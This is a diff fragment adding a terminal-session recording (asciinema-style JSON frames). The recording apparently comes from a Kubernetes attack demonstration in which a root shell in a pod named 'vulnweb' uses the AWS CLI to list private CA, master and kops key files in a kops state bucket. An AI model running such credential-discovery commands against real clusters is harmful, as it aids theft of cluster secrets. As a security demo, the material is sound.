+      "aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/\r/pki/private/"
+    ],
+    [
+      0.483975,
+      "c"
+    ],
+    [
+      0.157974,
+      "a"
+    ],
+    [
+      0.257881,
+      "/"
+    ],
+    [
+      0.268631,
+      "\r\n"
+    ],
+    [
+      0.323756,
+      "2017-10-26 03:18:51       1679 6481053812989537924894035303.key\r\n"
+    ],
+    [
+      0.030059,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      0.557833,
+      "aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/\r/pki/private/ca/"
+    ],
+    [
+      0.350103,
+      "\b\u001b[K"
+    ],
+    [
+      0.18979,
+      "\b\u001b[K"
+    ],
+    [
+      0.146118,
+      "\b\u001b[K"
+    ],
+    [
+      1.57723,
+      "m"
+    ],
+    [
+      0.07932,
+      "a"
+    ],
+    [
+      0.07695,
+      "s"
+    ],
+    [
+      0.168774,
+      "t"
+    ],
+    [
+      0.101374,
+      "e"
+    ],
+    [
+      0.079264,
+      "r"
+    ],
+    [
+      0.069405,
+      "/"
+    ],
+    [
+      0.221877,
+      "\r\n"
+    ],
+    [
+      0.339986,
+      "2017-10-26 03:18:52       1679 6481053813971630262290401578.key\r\n"
+    ],
+    [
+      0.031177,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "aws s3 ls s3://bgeesaman-kops-1.7.0-aws/kube.lonimbus.com/\r/pki/private/master/"
+    ],
+    [
+      0.406556,
+      "\b\u001b[K"
+    ],
+    [
+      0.146112,
+      "\b\u001b[K"
+    ],
+    [
+      0.14607,
+      "\b\u001b[K"
+    ],
+    [
+      0.134371,
+      "\b\u001b[K"
+    ],
+    [
+      0.133928,
+      "\b\u001b[K"
+    ],
+    [
+      0.124164,
+      "\b\u001b[K"
+    ],
+    [
+      0.135975,
+      "\b\u001b[K"
+    ],
+    [
+      1.946554,
+      "k"
+    ],
+    [
+      0.158474,
+      "p"
+    ],
+    [
+      0.010087,
+      "o"
+    ],
+    [
+      0.172468,
+      "s"
+    ],
+    [
+      0.446937,
+      "\b\u001b[K"
+    ],
+    [
+      0.145202,
+      "\b\u001b[K"
+    ],
+    [
+      0.137228,
+      "\b\u001b[K"
+    ],
+    [
+      0.199841,
+      "o"
+    ],
+    [
+      0.114293,
+      "p"
+    ],
+    [
+      0.101564,
+      "s"
+    ],
+    [
+      0.168644,
+      "/"
+    ],
+    [
+      0.18913,
+      "\r\n"
+    ],
+    [
+      0.325279,
+      "2017-10-26 03:18:52       1679 6481053811372868874041510357.key\r\n"
+    ],
+    [
+      0.029715,
+      "root@vulnweb-2569941405-q8v9r:/# "
+    ],
+    [
+      2.0,
+      "exit\r\n"
+    ],
+    [
+      0.030691,
+      "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
+    ]
+  ]
+}
